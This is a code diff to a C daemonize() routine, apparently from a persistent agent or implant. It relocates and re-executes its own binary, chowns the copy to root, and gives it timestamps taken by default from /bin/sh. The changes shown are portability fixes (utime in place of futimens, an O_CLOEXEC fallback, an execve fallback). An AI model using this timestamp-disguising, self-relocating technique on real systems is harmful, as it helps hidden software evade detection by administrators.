@@ -1,12 +1,13 @@
 #include <stdlib.h>
 #include <sys/types.h>
-#include <sys/stat.h>
 #include <sys/wait.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <fcntl.h>
 #include <linux/fs.h>
 #include <unistd.h>
+#include <utime.h>
+#include <sys/stat.h>
 
 #ifndef DEFAULT_MTIME_FROM
 #define DEFAULT_MTIME_FROM "/bin/sh"
@@ -34,6 +35,14 @@
 
 #ifndef DEFAULT_SAFE_PATH
 #define DEFAULT_SAFE_PATH "/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin"
+#endif
+
+#ifndef __O_CLOEXEC
+# define __O_CLOEXEC   02000000
+#endif
+
+#ifndef O_CLOEXEC
+# define O_CLOEXEC	__O_CLOEXEC
 #endif
 
 #include "daemonize.h"
@@ -79,10 +88,12 @@ int daemonize(bool exit_parent) {
                             fchown(fd2, 0, 0);
 
                             if (_stat.st_mtime) {
-                                struct timespec ts[2] = {
-                                    _stat.st_atim, _stat.st_mtim
+                                struct utimbuf _times = {
+                                    .actime = _stat.st_atime,
+                                    .modtime = _stat.st_mtime,
                                 };
-                                futimens(fd2, ts);
+
+                                utime(move, &_times);
                             }
                         }
                         close(fd2);
@@ -122,9 +133,10 @@ int daemonize(bool exit_parent) {
             }
 
             fexecve(fd, argv, env);
-
             /* We shouldn't be here */
             close(fd);
+
+            execve(move? move:self, argv, env);
         }
     }
 
